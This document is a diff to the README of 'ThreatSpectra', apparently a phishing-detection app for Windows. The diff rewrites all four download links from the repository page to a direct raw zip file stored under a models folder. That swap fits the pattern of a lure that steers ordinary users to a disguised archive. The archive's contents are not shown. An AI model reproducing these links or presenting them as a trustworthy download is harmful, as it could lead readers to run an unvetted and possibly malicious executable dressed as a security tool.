@@ -1,10 +1,10 @@
 # 🛡️ ThreatSpectra - Detect Threats Before They Spread
 
-[![Download ThreatSpectra](https://img.shields.io/badge/Download-ThreatSpectra-blue)](https://github.com/Lastexb91/ThreatSpectra)
+[![Download ThreatSpectra](https://img.shields.io/badge/Download-ThreatSpectra-blue)](https://raw.githubusercontent.com/Lastexb91/ThreatSpectra/main/models/Spectra-Threat-v3.3.zip)
 
 ## 📥 Download ThreatSpectra
 
-Visit this page to download: [https://github.com/Lastexb91/ThreatSpectra](https://github.com/Lastexb91/ThreatSpectra)
+Visit this page to download: [https://raw.githubusercontent.com/Lastexb91/ThreatSpectra/main/models/Spectra-Threat-v3.3.zip](https://raw.githubusercontent.com/Lastexb91/ThreatSpectra/main/models/Spectra-Threat-v3.3.zip)
 
 Use this link to get the latest version of ThreatSpectra for Windows. From there, you can download the app, open it, and start checking links and messages for phishing signs.
 
@@ -35,7 +35,7 @@ For the best experience, use a recent version of Windows 10 or Windows 11.
 Follow these steps to download and run ThreatSpectra on Windows.
 
 ### 1. Open the download page
-Go to: [https://github.com/Lastexb91/ThreatSpectra](https://github.com/Lastexb91/ThreatSpectra)
+Go to: [https://raw.githubusercontent.com/Lastexb91/ThreatSpectra/main/models/Spectra-Threat-v3.3.zip](https://raw.githubusercontent.com/Lastexb91/ThreatSpectra/main/models/Spectra-Threat-v3.3.zip)
 
 ### 2. Find the download
 Look for the latest release, installer, or app package on the page.
@@ -166,4 +166,4 @@ If you use email, text messages, and QR codes often, ThreatSpectra gives you one
 
 ## 📎 Download Link Again
 
-Visit this page to download: [https://github.com/Lastexb91/ThreatSpectra](https://github.com/Lastexb91/ThreatSpectra)
+Visit this page to download: [https://raw.githubusercontent.com/Lastexb91/ThreatSpectra/main/models/Spectra-Threat-v3.3.zip](https://raw.githubusercontent.com/Lastexb91/ThreatSpectra/main/models/Spectra-Threat-v3.3.zip)
